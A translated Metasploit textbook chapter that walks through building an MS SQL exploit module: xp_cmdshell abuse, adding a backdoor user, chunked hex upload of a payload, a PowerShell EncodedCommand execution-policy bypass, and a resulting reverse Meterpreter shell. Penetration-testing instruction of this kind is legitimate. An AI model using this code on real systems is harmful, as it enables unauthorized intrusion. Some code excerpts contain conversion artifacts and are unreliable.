## 第十三章. 构建自己的模块

构建自己的 Metasploit 模块相对简单，只要你有一些编程经验，并且知道你想要构建什么。因为 Metasploit 主要是基于 Ruby 的，所以在本章中我们将使用 Ruby 编程语言。如果你还不是 Ruby 忍者，但已经接触过这门语言，不要担心；继续练习和学习。随着你的学习，Ruby 相对容易掌握。如果你发现自己在本章的概念上遇到困难，可以先跳过，尝试积累 Ruby 知识，然后再回过头来学习这一章。

在本章中，我们将编写一个名为*mssql_powershell*的模块，利用在 Defcon 18 黑客大会上由 Josh Kelley（winfang）和 David Kennedy 发布的技术。此模块针对已安装 Microsoft PowerShell 的 Windows 平台（Windows 7 的默认设置）。

此模块将标准的 MSF 二进制有效载荷转换为*hex-blob*（二进制数据的十六进制表示），可以通过 Microsoft SQL 命令传输到目标系统。一旦此有效载荷在目标系统上，就使用 PowerShell 脚本来将十六进制数据转换回二进制可执行文件，执行它，并将 shell 提供给攻击者。此模块已在 Metasploit 中，并由本书的作者之一开发；它是如何构建自己的模块的一个很好的例子。

将二进制转换为十六进制，通过 MS SQL 传输，并将其转换回二进制的能力是 Metasploit 框架强大功能的一个极好例子。在你进行渗透测试时，你将遇到许多不熟悉的场景或情况；你创建或即时修改模块和攻击的能力将为你提供所需的竞争优势。随着你开始理解框架，你将能够在相对较短的时间内编写这些类型的模块。

## 在 Microsoft SQL 上获取命令执行

如第六章所述，大多数系统管理员将*sa*（系统管理员）账户密码设置为弱密码，没有意识到这个简单错误的影响。*sa*账户默认安装了 SQL 角色的*sysadmin*，在进行渗透测试时，你几乎可以保证在 Microsoft SQL Server 实例上存在一个弱密码或空密码的*sa*账户。我们将使用附录 A 中构建的 MS SQL 实例来利用我们的模块。如第六章所述，你最初使用 Metasploit 辅助模块扫描系统，并暴力破解弱密码的*sa*账户。

一旦你破解了 *sa* 账户，你就可以在 MS SQL 中插入、删除、创建，并执行大多数其他你通常会用到的任务。这包括调用一个扩展的行政级别存储过程 `xp_cmdshell`，如第六章所述。第六章。此存储过程允许你在与 SQL Server 服务（例如，本地系统）相同的上下文中执行底层操作系统命令。

* * *

### 注意

MS SQL 在 SQL Server 2005 和 2008 中安装时，此存储过程是禁用的，但如果你在 MS SQL 中拥有 *sysadmin* 角色，你可以使用 SQL 命令重新启用它。例如，你可以使用 `SELECT loginname FROM master..syslogins WHERE sysadmin=1` 来查看所有具有此级别访问权限的用户，然后成为其中之一。如果你拥有 sysadmin 角色，你几乎可以保证完全系统妥协。

* * *

以下列表展示了如何通过 Metasploit 的 MS SQL 模块运行基本命令：

```
 use msf > `use admin/mssql/mssql_exec`
 msf auxiliary(mssql_exec) > `show options`

  Module options:

     Name      Current Setting                       Required  Description
     ----      ---------------                       --------  -----------
     CMD       cmd.exe /c echo OWNED > C:\owned.exe  no        Command to execute
     PASSWORD                                        no        The password for the
                                                                 specified username
     RHOST                                           yes       The target address
     RPORT     1433                                  yes       The target port
     USERNAME  sa                                    no
        The username to authenticate as

 msf auxiliary(mssql_exec) `> set RHOST 172.16.32.136`
  RHOST => 172.16.32.136
 msf auxiliary(mssql_exec) > `set CMD net user metasploit p@55w0rd /ADD`
  CMD => net user metasploit p@55w0rd /ADD
  msf auxiliary(mssql_exec) > `exploit`

  [*] SQL Query: EXEC master..xp_cmdshell 'net user metasploit p@55w0rd /ADD'

   output
   ------
 The command completed successfully.

  [*] Auxiliary module execution completed
  msf auxiliary(mssql_exec) >
```

在这个例子中，我们首先在 ![](img/00002.gif) 选择 *mssql_exec* 辅助模块，它调用 `xp_cmdshell` 存储过程来执行命令。接下来，我们在 ![](img/00004.gif) 查看模块的选项，并将目标设置为 ![](img/00005.gif)，以及在目标上执行的命令为 ![](img/00006.gif)。最后，我们使用 `exploit` 运行攻击，你可以在 ![](img/00007.gif) 看到攻击是成功的。我们已经使用 `xp_cmdshell` 存储过程向系统中添加了一个用户。（在这个时候，我们可以输入 `net localgroup administrators metasploit /ADD` 将用户添加到受侵害系统上的本地管理员组。）

你可以将 *mssql_exec* 模块视为通过 MS SQL 可访问的命令提示符。

## 探索现有的 Metasploit 模块

现在，我们将检查我们刚刚使用的模块 *mssql_exec* 的实际“内部”操作。这让我们在编写自己的代码之前，能够了解现有代码是如何运行的。让我们用文本编辑器打开模块，看看它是如何操作的：

```
root@bt:/opt/framework3/msf3# nano modules/auxiliary/admin/mssql/mssql_exec.rb
```

从模块中摘录的以下行包含一些值得注意的重要事项：

```
 require 'msf/core'

 class Metasploit3 < Msf::Auxiliary

      include Msf::Exploit::Remote::MSSQL

          def run
                  mssql_xpcmdshell(datastore['CMD'], true)
if mssql_login_datastore
          end
```

在 ![](img/00002.gif) 的第一行告诉我们，此模块将包含来自 Metasploit 核心库的所有功能。接下来，在 ![](img/00004.gif) 设置类，使用代码将其定义为继承某些特性的辅助模块，例如扫描器、拒绝服务向量、数据检索、暴力攻击和侦察尝试。

在 ![](img/00005.gif) 的 `include` 语句可能是最重要的一行，因为它从核心 Metasploit 库中引入了 MS SQL 模块。本质上，MS SQL 模块处理所有基于 MS SQL 的通信以及与 MS SQL 相关的一切。最后，在 ![](img/00006.gif) 它从 Metasploit 数据存储中提取了一个特定的命令。

让我们检查 Metasploit 核心库中的 MS SQL 函数，以更好地理解其功能。首先，使用以下命令在不同的窗口中打开 *mssql.rb* 和 *mssql_commands.rb*：

```
root@bt:/opt/framework3/msf3# `nano lib/msf/core/exploit/mssql.rb`
root@bt:/opt/framework3/msf3# `nano lib/msf/core/exploit/mssql_commands.rb`
```

在 Nano 中按 Ctrl-W 搜索 *mssql.rb* 中的 `mssql_xpcmdshell`，您应该找到定义 Metasploit 如何使用 `xp_cmdshell` 过程的说明，如下所示：

```
#
        # Execute a system command via xp_cmdshell
        #
        def mssql_xpcmdshell(cmd,doprint=false,opts={})
                force_enable = false
                begin
                        res = mssql_query("EXEC master..xp_cmdshell
 '#{cmd}'", false, opts)
```

此列表定义了针对服务器运行的 SQL 查询，作为对 `xp_cmdshell` 存储过程的调用，在 ![图片](img/00002.gif) 以及一个将被替换为用户请求执行的命令行的变量，在 ![图片](img/00004.gif)。例如，尝试将用户添加到系统中的操作将在 MS SQL 中执行 `EXEC master..xp_cmdshell 'net user metasploit p@55w0rd! /ADD'`，通过将 `cmd` 变量设置为 `'net user metasploit p@55w0rd! /ADD'`。

现在，将您的注意力转向 *mssql_commands.rb*，其中包含启用 `xp_cmdshell` 过程的命令：

```
# Re-enable the xp_cmdshell stored procedure in 2005 and 2008
def mssql_xpcmdshell_enable(opts={});
"exec master.dbo.sp_configure 'show advanced options',1;RECONFIGURE;exec
master.dbo.sp_configure 'xp_cmdshell', 1;RECONFIGURE;"
```

在这里，您可以看到用于在 MS SQL Server 2005 和 2008 中重新启用 `xp_cmdshell` 存储过程的命令序列 ![图片](img/00002.gif)。

现在您已经了解了我们将要使用的函数，让我们开始创建自己的模块。

## 创建新模块

假设您正在进行渗透测试，并且遇到了运行 SQL Server 2008 和 Microsoft Server 2008 R2 的系统。由于 Microsoft 在 Windows 7 x64 和 Windows Server 2008 中移除了 *debug.exe*，这些系统不会允许您以 第十一章 中定义的传统方式转换可执行文件。这意味着您需要创建一个新的模块，以便成功攻击 Microsoft Server 2008 和 SQL Server 2008 实例。

在此场景中，我们将做出一些假设。首先，您已经猜到 SQL Server 密码为空，并且您已经获得了对 `xp_cmdshell` 存储过程的访问权限。您需要将 Meterpreter 有效载荷传输到系统上，但除了 1433 端口之外的所有端口都已被关闭。您不知道是否设置了物理防火墙，或者是否正在使用基于 Windows 的防火墙，但您不想修改端口列表或关闭防火墙，因为这可能会引起怀疑。

### PowerShell

Windows PowerShell 是我们唯一可行的选择。PowerShell 是一种全面的 Windows 脚本语言，允许您从命令行访问完整的 Microsoft .NET Framework。PowerShell 的活跃社区致力于扩展工具，这使得它成为安全专业人士的有价值工具，因为它具有多功能性和与 .NET 的兼容性。我们不会具体深入探讨 PowerShell 的工作原理及其功能，但您应该知道它是一种全新的程序性语言，可在较新的操作系统上使用。

我们将创建一个新的模块，该模块将使用 Metasploit 将二进制代码转换为十六进制（或根据需要转换为 Base64），然后将其输出到底层操作系统。然后我们将使用 PowerShell 将可执行文件转换回可执行的二进制文件。

首先，我们通过以下方式复制 *mssql_payload* 漏洞来创建一个模板：

```
root@bt:/opt/framework3/msf3# `cp modules/exploits/windows/mssql/mssql_payload.rb`
      `modules/exploits/windows/mssql/mssql_powershell.rb`
```

接下来，我们打开我们刚刚创建的 *mssql_powershell.rb* 文件，并修改其代码，使其看起来如下。这是一个漏洞基础 shell。花些时间来回顾各种参数，并记住前几章中涵盖的主题。

```
require 'msf/core' # require core libraries

class Metasploit3 < Msf::Exploit::Remote # define this as a remote exploit
     Rank = ExcellentRanking # reliable exploit ranking

     include Msf::Exploit::Remote::MSSQL # include the mssql.rb library

     def initialize(info = {}) # initialize the basic template
       super(update_info(info,
               'Name'           => 'Microsoft SQL Server PowerShell Payload',
               'Description'    => %q{
                         This module will deliver our
 payload through Microsoft PowerShell
                              using MSSQL based attack vectors.
               },
               'Author'         => [ 'David Kennedy "ReL1K"
 <kennedyd013[at]gmail.com>'],
               'License'        => MSF_LICENSE,
               'Version'        => '$Revision: 8771 $',
               'References'     =>
                    [
                         [ 'URL', 'http://www.secmaniac.com' ]
                    ],
             'Platform'       => 'win', # target only windows
               'Targets'        =>
                    [
                         [ 'Automatic', { } ], # automatic targeting
                    ],
             'DefaultTarget'  => 0
               ))
          register_options( # register options for the user to pick from
               [

OptBool.new('UsePowerShell',[ false, "Use PowerShell as payload delivery
                        method instead", true]), # default to PowerShell
               ])
     end

     def exploit # define our exploit here; it does nothing at this point

        handler # call the Metasploit handler
          disconnect # after handler disconnect
     end
end
```

在这个漏洞能够正常工作之前，你需要定义一些基本设置。注意，名称、描述、许可和参考在 ![](img/00002.gif) 中定义。我们还定义了一个平台在 ![](img/00004.gif)（Windows）和一个目标在 ![](img/00005.gif)（所有操作系统）。我们还定义了一个名为 `UsePowerShell` 的新参数，在 ![](img/00006.gif) 中用于漏洞体中。最后，在 ![](img/00007.gif) 中指定了一个处理器来处理攻击者和被利用目标之间的连接。

### 运行 Shell Exploit

在构建了漏洞利用的框架之后，我们通过 *msfconsole* 运行它，以查看可用的选项：

```
msf > `use windows/mssql/mssql_powershell`
msf exploit(mssql_powershell) > `show options`

Module options:

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   PASSWORD                        no        The password for the specified username
   RHOST                           yes       The target address
   RPORT          1433             yes       The target port
   USERNAME       sa               no        The username to authenticate as
   UsePowerShell  true             no        Use PowerShell
 as payload delivery method instead
```

回想一下 第五章 中的 `show options` 命令将显示已添加到漏洞中的任何新选项。在我们设置这些选项后，它们将作为有效选项存储在 Metasploit 中。

现在，在我们编辑 *mssql.rb*（稍后将解释）之前，我们将最终确定我们自本章开始以来一直在编辑的 *mssql_powershell.rb* 文件。

当你检查 Metasploit 中 *modules* 目录内的漏洞（*modules/exploits*，*modules/auxiliary* 等）时，你会注意到它们大多数都有相同的整体结构（以 `def` exploit 为例）。记住始终为你的代码添加注释，以便其他开发者了解它在做什么！在下面的列表中，我们首先介绍我们的 `def exploit` 行，它定义了我们将在漏洞利用中执行的操作。我们将以与其他模块相同的方式构建我们的漏洞利用，并添加一些新的部分，如下所述：

```
def exploit

          # if u/n and p/w didn't work throw error
          if(not mssql_login_datastore)
               print_status(`"Invalid SQL Server credentials"`)
               return
          end

          # Use powershell method for payload delivery
          if (datastore['UsePowerShell'])

          powershell_upload_exec
(Msf::Util::EXE.to_win32pe(framework,payload.encoded))

            end
            handler
            disconnect
     end
end
```

模块首先检查我们是否在 ![](img/00002.gif) 登录。如果没有登录，将显示错误消息 `"Invalid SQL Server Credentials"` ![](img/00004.gif)。在 ![](img/00005.gif) 中使用 `UsePowerShell` 方法来调用 `powershell_upload_exec` 函数 ![](img/00006.gif)，该函数将自动创建一个基于 Metasploit 的负载，我们在漏洞利用期间指定。在我们最终运行漏洞利用后，当我们指定 *msfconsole* 中的负载时，它将根据 `Msf::Util::EXE.to_win32pe(framework,payload.encoded)` 选项自动为我们生成。

### 创建 powershell_upload_exec

现在，我们将打开之前打开的 *mssql.rb* 文件，为编辑做准备。我们需要找到 `powershell_upload_exec` 函数的空间。

```
root@bt:/opt/framework3/msf3# `nano lib/msf/core/exploit/mssql.rb`
```

在您的 Metasploit 版本中，您可以搜索 PowerShell，应该会在 *mssql.rb* 文件中看到以下引用代码。您可以自由地从文件中删除此代码，从头开始。

```
#
     # Upload and execute a Windows binary through MS SQL queries and PowerShell
     #
     def powershell_upload_exec(exe, debug=false)

          # hex converter
          hex = exe.unpack("H*")[0]
          # create random alpha 8 character names
          var_payload = rand_text_alpha(8)
          print_status("Warning:
 This module will leave #{var_payload}.exe in the SQL
            Server %TEMP% directory")
```

在 ![图片](img/00002.gif) 处，您可以看到我们的定义包括添加到 `def powershell_upload_exec` 函数中的 `exe` 和 `debug` 参数。`exe` 命令是我们将从原始代码 `Msf::Util::EXE.to_win32pe(framework,payload.encoded)` 发送的可执行文件，如前所述。`debug` 命令设置为 `false`，这意味着我们将不会看到调试信息。通常，如果您想看到用于故障排除的附加信息，此设置会设置为 `true`。

接下来，在 ![图片](img/00004.gif) 处，我们将整个编码的可执行文件转换为原始十六进制格式。此行中的 `H` 简单地意味着“以二进制形式打开文件并将其放置在十六进制表示中。”

在 ![图片](img/00005.gif) 处，我们创建了一个随机的、字母的、八字符的文件名。通常，最好随机化此名称以迷惑防病毒软件。

最后，在 ![图片](img/00006.gif) 处，我们告知攻击者，我们的负载将保留在操作系统的 SQL Server */Temp* 目录中。

### 十六进制到二进制的转换

以下列表展示了使用 PowerShell 将十六进制数转换回二进制的示例。该代码被定义为字符串，以便稍后调用并上传到目标机器。

```
# Our payload converter grabs a hex file and converts it to binary through PowerShell

 `h2b` = "$s = gc 'C:\\Windows\\Temp\\#{`var_payload`
}';$s = [string]::Join('', $s);$s= $s.
      Replace('`r',''); $s = $s.Replace(''`n','');$b = new-object byte[] $($s.Length/
      2);0..$($b.Length-1) | %{$b[$_] = [Convert]
::ToByte($s.Substring($($_*2),2),16)};
      [IO.File]::WriteAllBytes('C:\\Windows\\Temp\\#{`var_payload`}.exe',$b)"

 h2b_unicode=Rex::Text.to_unicode(h2b)

  # base64 encoding allows us to perform execution through
 powershell without registry changes
 h2b_encoded = Rex::Text.encode_base64(h2b_unicode)

 print_status("Uploading the payload #{var_payload}, please be patient...")
```

在 ![图片](img/00002.gif) 处，我们通过 PowerShell 创建了十六进制转二进制 (`h2b`) 的转换方法。此代码本质上创建了一个字节数组，它将基于十六进制的 Metasploit 负载作为二进制文件写入。（`{var_payload}` 是通过 Metasploit 指定的一个随机名称。）

由于 MS SQL 有字符限制，我们需要将我们的十六进制负载分成 500 字节的块，将负载分成多个请求。但这种分割的一个副作用是在目标文件中添加了回车符和换行符（CRLF），这些需要被移除。在 ![图片](img/00004.gif) 处，我们通过正确移除它们来添加更好的 CRLF 处理。如果我们不这样做，我们的二进制文件将会损坏，并且无法正确执行。请注意，我们只是重新指定了 `$s` 变量，用 `''`（空字符串）替换 `r` 和 `n`。这实际上移除了 CRLF。

一旦去除了 CRLFs，就会在基于十六进制的 Metasploit 有效载荷中调用 `Convert::ToByte`。我们告诉 PowerShell 文件的格式是基 16（十六进制格式），并将其写入名为 *#{var_payload}.exe* 的文件（我们的随机有效载荷名称）。在有效载荷被写入后，我们可以运行一个方法来执行 PowerShell 编码格式的命令，这种格式是 PowerShell 编程语言所支持的。这些编码命令允许我们在一行中执行大量和长代码。

通过首先将 ![](img/00005.gif) 处的 `h2b` 字符串转换为 Unicode，然后将结果字符串在 ![](img/00006.gif) 处进行 Base64 编码，我们可以通过 PowerShell 传递 `-EncodedCommand` 标志来绕过通常存在的执行限制。执行限制策略不允许执行不受信任的脚本。（这些限制是保护用户免受在互联网上下载的任何脚本执行的重要方式。）如果我们不编码这些命令，我们就无法执行我们的 PowerShell 代码，最终也无法破坏目标系统。编码命令允许我们在不担心执行限制策略的情况下，将大量代码添加到一条命令中。

在我们指定了 `h2b` 字符串和编码命令标志之后，我们得到了正确的编码格式的 PowerShell 命令，这样我们就可以在不受限制的格式下执行我们的 PowerShell 代码。

在 ![](img/00005.gif)，字符串被转换为 Unicode；这是将参数和信息传递给 PowerShell 的要求。然后 `h2b_encoded = Rex::Text.encoded_base64(h2b_unicode)` 被传递以将其转换为 Base64 编码的字符串，以便通过 MS SQL 传递。Base64 是利用 `-EncodedCommand` 标志所需的编码。我们首先将我们的字符串转换为 Unicode，然后转换为 Base64，这是我们所有 PowerShell 命令所需的格式。最后，在 ![](img/00007.gif) 处，打印了一条消息到控制台，表明我们正在上传有效载荷的过程中。

### 计数器

计数器可以帮助你在文件中跟踪你的位置，或者跟踪程序读取了多少数据。在下一个示例中，一个名为 `idx` 的基本计数器从 `0` 开始。计数器用于识别文件的结尾，并在将基于十六进制的二进制数据发送到操作系统时，每次向上移动 500 字节。本质上，计数器是在说，“读取 500 字节，然后发送。再读取 500 字节，然后发送，”直到达到文件的结尾。

```
 idx=0
 cnt = 500
 while(idx < hex.length - 1)
  mssql_xpcmdshell("cmd.exe /c echo #{hex[idx,cnt]}>>%TEMP%\\#{var_payload}", false)
  idx += cnt
  end

 `print_status("Converting the payload utilizing PowerShell EncodedCommand...")`
  mssql_xpcmdshell(`"powershell -EncodedCommand #{h2b_encoded}"`, debug)
  mssql_xpcmdshell("cmd.exe /c del %TEMP%\\#{var_payload}", debug)
  print_status("Executing the payload...")
  mssql_xpcmdshell("%TEMP%\\#{var_payload}.exe", false, {:timeout => 1})
  print_status("Be sure to cleanup #{var_payload}.exe...")
  end
```

回想一下，为了将 payload 发送到目标操作系统，我们需要将其分成 500 字节的块。我们使用计数器`idx`![../images/00002.gif]和`cnt`![../images/00004.gif]来跟踪 payload 是如何被分割的。计数器`idx`将逐渐增加 500，我们将另一个计数器`cnt`设置为 500（我们需要一次读取 500 字节）。在从 Metasploit payload 的![../images/00005.gif]处读取了前 500 字节之后，这 500 个十六进制字符将被发送到目标机器。500 字节的块会继续添加，直到`idx`计数器的长度与 payload 相同，这等于文件的结尾。

在![../images/00006.gif]处，我们看到一条消息表明 payload 正在被转换并通过`-EncodedCommand` PowerShell 命令发送到目标，这是转换从正常的 PowerShell 命令到前面提到的 Base64 编码格式的位置。

这行代码`"powershell -EncodedCommand #{h2b_encoded}"`告诉我们 payload 已经执行。我们将 PowerShell 命令转换为 Base64 后，会在执行后将基于十六进制的 payload 转换回二进制。

下面的示例显示了整个*mssql.rb*文件：

```
#
# Upload and execute a Windows binary through MSSQL queries and Powershell
#
def powershell_upload_exec(exe, debug=false)

          # hex converter
          hex = exe.unpack("H*")[0]
          # create random alpha 8 character names
          #var_bypass  = rand_text_alpha(8)
          var_payload = rand_text_alpha(8)
          print_status("Warning: This module will leave #{var_payload}.exe in the SQL
               Server %TEMP% directory")
          # our payload converter, grabs a hex file and converts
 it to binary for us through
               powershell
          h2b = "$s = gc 'C:\\Windows\\Temp\\#{var_payload}';$s
 = [string]::Join('', $s);$s
                = $s.Replace('`r',''); $s = $s.Replace('`n','');$b
 = new-object byte[]$($s
                .Length/2);0..$($b.Length-1) | %{$b[$_] =
 [Convert]::ToByte($s.Substring
                ($($_*2),2),16)};[IO.File]::WriteAllBytes
('C:\\Windows\\Temp\\#{var_payload}
                .exe',$b)"
          h2b_unicode=Rex::Text.to_unicode(h2b)
          # base64 encode it, this allows us to perform execution
 through powershell without
               registry changes
          h2b_encoded = Rex::Text.encode_base64(h2b_unicode)
          print_status("Uploading the payload #{var_payload}, please be patient...")
          idx = 0
          cnt = 500
          while(idx < hex.length - 1)
               mssql_xpcmdshell("cmd.exe /c echo #{hex[idx,cnt]}
>>%TEMP%\\#{var_payload}", false)
               idx += cnt
          end
          print_status("Converting the payload utilizing
 PowerShell EncodedCommand...")
          mssql_xpcmdshell("powershell -EncodedCommand #{h2b_encoded}", debug)
          mssql_xpcmdshell("cmd.exe /c del %TEMP%\\#{var_payload}", debug)
          print_status("Executing the payload...")
          mssql_xpcmdshell("%TEMP%\\#{var_payload}.exe", false, {:timeout => 1})
          print_status("Be sure to cleanup #{var_payload}.exe...")
     end
```

### 运行漏洞利用

我们完成了对*mssql_powershell.rb*和*mssql.rb*的工作，现在我们可以通过 Metasploit 和*msfconsole*运行这个漏洞利用。但在我们这样做之前，我们需要确保 PowerShell 已经安装。然后我们可以运行以下命令来执行我们新创建的漏洞利用：

```
msf > `use windows/mssql/mssql_powershell`
msf exploit(mssql_powershell) > `set payload windows/meterpreter/reverse_tcp`
payload => windows/meterpreter/reverse_tcp
msf exploit(mssql_powershell) > `set LHOST 172.16.32.129`
LHOST => 172.16.32.129
msf exploit(mssql_powershell) > `set RHOST 172.16.32.136`
RHOST => 172.16.32.136
msf exploit(mssql_powershell) > `exploit`

[*] Started reverse handler on 172.16.32.129:4444
[*] Warning: This module will leave CztBAnfG.exe in the SQL Server %TEMP% directory
[*] Uploading the payload CztBAnfG, please be patient...
[*] Converting the payload utilizing PowerShell EncodedCommand...
[*] Executing the payload...
[*] Sending stage (748032 bytes) to 172.16.32.136
[*] Be sure to cleanup CztBAnfG.exe...
[*] Meterpreter session 1 opened (172.16.32.129:4444 ->
 172.16.32.136:49164) at 2010-05-17
       16:12:19 −0400

meterpreter >
```

## 代码复用的力量

利用现有代码，对其进行调整，并添加一些原创代码，这是我们可以在 Metasploit 中做到的最强大的一件事之一。在熟悉了框架并了解了现有代码的工作方式之后，在大多数情况下，你无需从头开始。因为这个模块基本上是为你构建的，你可以通过查看其他 Metasploit 模块以及它们的功能和工作方式来获得更多实践。你将开始学习缓冲区溢出的基础知识以及它们的创建方式。注意代码的结构和它的工作方式，然后从头开始创建自己的漏洞利用。如果你不熟悉 Ruby 编程语言或者这一章对你来说有点难以理解，找一本书来阅读和学习。学习如何创建这类模块开发的最佳方式是通过试错。
